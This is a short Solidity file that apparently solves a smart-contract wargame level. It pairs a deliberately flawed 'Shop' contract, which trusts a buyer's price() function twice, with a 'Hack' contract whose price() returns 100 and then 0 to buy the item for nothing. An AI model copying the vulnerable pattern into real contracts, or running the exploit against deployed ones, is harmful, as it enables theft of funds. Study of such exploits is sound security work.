// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract Hack is Buyer {

    Shop public target;
    constructor(Shop _target) {
        target = _target;
    }

    function price() external view returns (uint) {
        if (target.isSold()) { 
        return 0;
        } else {
        return 100;
        }
    }

    function hack() external {
        target.buy();
    }

}